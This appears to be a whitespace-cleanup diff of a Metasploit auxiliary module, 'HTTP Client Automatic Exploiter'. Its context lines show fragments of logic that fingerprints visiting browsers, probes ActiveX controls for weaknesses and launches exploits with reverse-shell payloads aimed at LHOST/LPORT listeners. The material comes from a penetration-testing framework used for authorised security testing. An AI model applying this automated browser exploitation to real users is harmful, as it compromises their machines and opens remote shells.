@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -25,9 +25,9 @@ require 'rex/exploitation/javascriptosdetect'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpServer::HTML
-	
+
 	def initialize(info = {})
-		super(update_info(info, 
+		super(update_info(info,
 			'Name'        => 'HTTP Client Automatic Exploiter',
 			'Version'     => '$Revision$',
 			'Description' => %q{
@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
 				techniques to fingerprint HTTP clients and then automatically
 				exploit them.
 				},
-			'Author'      => 
+			'Author'      =>
 				[
 					# initial concept, integration and extension of Jerome
 					# Athias' os_detect.js
@@ -45,46 +45,46 @@ class Metasploit3 < Msf::Auxiliary
 			'Actions'     =>
 				[
 					[ 'WebServer', {
-						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits' 
+						'Description' => 'Start a bunch of modules and direct clients to appropriate exploits'
 					} ],
 					[ 'DefangedDetection', {
-						'Description' => 'Only perform detection, send no exploits' 
+						'Description' => 'Only perform detection, send no exploits'
 					} ],
-					[ 'list', { 
+					[ 'list', {
 						'Description' => 'List the exploit modules that would be started'
 					} ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[ 'WebServer', 'DefangedDetection' ],
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptAddress.new('LHOST', [true, 
+			OptAddress.new('LHOST', [true,
 				'The IP address to use for reverse-connect payloads'
 			]),
 		], self.class)
 
 		register_advanced_options([
-			OptString.new('MATCH', [false, 
+			OptString.new('MATCH', [false,
 				'Only attempt to use exploits whose name matches this regex'
 			]),
-			OptString.new('EXCLUDE', [false, 
+			OptString.new('EXCLUDE', [false,
 				'Only attempt to use exploits whose name DOES NOT match this regex'
 			]),
-			OptBool.new('DEBUG', [false, 
+			OptBool.new('DEBUG', [false,
 				'Do not obfuscate the javascript and print various bits of useful info to the browser',
 				false
 			]),
-			OptPort.new('LPORT_WIN32', [false, 
+			OptPort.new('LPORT_WIN32', [false,
 				'The port to use for Windows reverse-connect payloads, default is 3333'
 			]),
-			OptPort.new('LPORT_LINUX', [false, 
+			OptPort.new('LPORT_LINUX', [false,
 				'The port to use for Linux reverse-connect payloads, default is 4444'
 			]),
-			OptPort.new('LPORT_MAC', [false, 
+			OptPort.new('LPORT_MAC', [false,
 				'The port to use for Mac reverse-connect payloads, default is 5555'
 			]),
-			OptPort.new('LPORT_GENERIC', [false, 
+			OptPort.new('LPORT_GENERIC', [false,
 				'The port to use for generic reverse-connect payloads, default is 6666'
 			]),
 		], self.class)
@@ -110,14 +110,14 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Found #{@exploits.length} exploit modules")
 		elsif (action.name == 'DefangedDetection')
 			exploit()
-		else 
+		else
 			start_exploit_modules()
 			if @exploits.length < 1
 				print_error("No exploits, check your MATCH and EXCLUDE settings")
 				return false
 			end
 			exploit()
-		end 
+		end
 	end
 
 
@@ -131,11 +131,11 @@ class Metasploit3 < Msf::Auxiliary
 
 			function make_xhr() {
 				var xhr;
-				try { 
-					xhr = new XMLHttpRequest(); 
+				try {
+					xhr = new XMLHttpRequest();
 				} catch(e) {
-					try { 
-						xhr = new ActiveXObject("Microsoft.XMLHTTP"); 
+					try {
+						xhr = new ActiveXObject("Microsoft.XMLHTTP");
 					} catch(e) {
 						xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
 					}
@@ -271,7 +271,7 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			lport = @gen_lport
 			payload='generic/shell_reverse_tcp'
-		end	
+		end
 		@payloads[lport] = payload
 
 		print_status("Starting exploit #{name} with payload #{payload}")
@@ -281,9 +281,9 @@ class Metasploit3 < Msf::Auxiliary
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
 		if (datastore['DEBUG'])
-			@exploits[name].datastore['URIPATH'] = name  
+			@exploits[name].datastore['URIPATH'] = name
 		else
-			@exploits[name].datastore['URIPATH'] = nil  
+			@exploits[name].datastore['URIPATH'] = nil
 		end
 
 		@exploits[name].datastore['LPORT'] = lport
@@ -312,7 +312,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	def start_exploit_modules() 
+	def start_exploit_modules()
 		@lhost = (datastore['LHOST'] || "0.0.0.0")
 
 		@js_tests = {}
@@ -338,12 +338,12 @@ class Metasploit3 < Msf::Auxiliary
 					apo[:vuln_test] = ""
 					apo[:ua_name] = HttpClients::IE
 					if apo[:classid].kind_of?(Array)  # then it's many classids
-						apo[:classid].each { |clsid| 
+						apo[:classid].each { |clsid|
 							apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
 							apo[:vuln_test] << " is_vuln = true;\n"
 							apo[:vuln_test] << "}\n"
 						}
-					else 
+					else
 						apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
 						apo[:vuln_test] << " is_vuln = true;\n"
 						apo[:vuln_test] << "}\n"
@@ -351,7 +351,7 @@ class Metasploit3 < Msf::Auxiliary
 				end
 
 				if apo[:ua_minver] and apo[:ua_maxver]
-					ver_test = 
+					ver_test =
 							"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
 							"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
 				elsif apo[:ua_minver]
@@ -420,14 +420,14 @@ class Metasploit3 < Msf::Auxiliary
 		@js_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
-		
+
 		@noscript_tests.each { |browser,tests|
 			tests.sort! {|a,b| b[:rank] <=> a[:rank]}
 		}
 
 	end
 
-	def on_request_uri(cli, request) 
+	def on_request_uri(cli, request)
 		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
 
 		case request.uri
@@ -453,7 +453,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Responding with exploits")
 				response = build_script_response(cli, request)
 			end
-			
+
 			cli.send_response(response)
 		when %r{^#{self.get_resource}.*ns=1}
 			# This is the request for the exploit page when javascript is NOT
@@ -470,7 +470,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Responding with non-javascript exploits")
 				response = build_noscript_response(cli, request)
 			end
-			
+
 			response["Expires"] = "0"
 			response["Cache-Control"] = "must-revalidate"
 			cli.send_response(response)
@@ -607,7 +607,7 @@ class Metasploit3 < Msf::Auxiliary
 					} else {
 						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
 					}
-					//alert("next_exploit(" + (exploit_idx).toString() + ") => " + 
+					//alert("next_exploit(" + (exploit_idx).toString() + ") => " +
 					//	global_exploit_list[exploit_idx].resource + "\\n" +
 					//	test + " -- " + eval(test)
 					//);
@@ -618,7 +618,7 @@ class Metasploit3 < Msf::Auxiliary
 						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
 						next_exploit(exploit_idx+1);
 					}
-				} catch(e) { 
+				} catch(e) {
 					next_exploit(exploit_idx+1);
 				};
 			}
@@ -699,9 +699,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		data_offset = request.uri.index('sessid=')
 		#p request['User-Agent']
-		if (data_offset.nil? or -1 == data_offset) 
+		if (data_offset.nil? or -1 == data_offset)
 			# then we didn't get a report back from our javascript
-			# detection; make a best guess effort from information 
+			# detection; make a best guess effort from information
 			# in the user agent string.  The OS detection should be
 			# roughly the same as the javascript version on non-IE
 			# browsers because it does most everything with
@@ -743,7 +743,7 @@ class Metasploit3 < Msf::Auxiliary
 		@targetcache[key] ||= {}
 		@targetcache[key][:updated_at] = Time.now.to_i
 
-		# Clean the cache 
+		# Clean the cache
 		rmq = []
 		@targetcache.each_key do |addr|
 			if (Time.now.to_i > @targetcache[addr][:updated_at]+60)
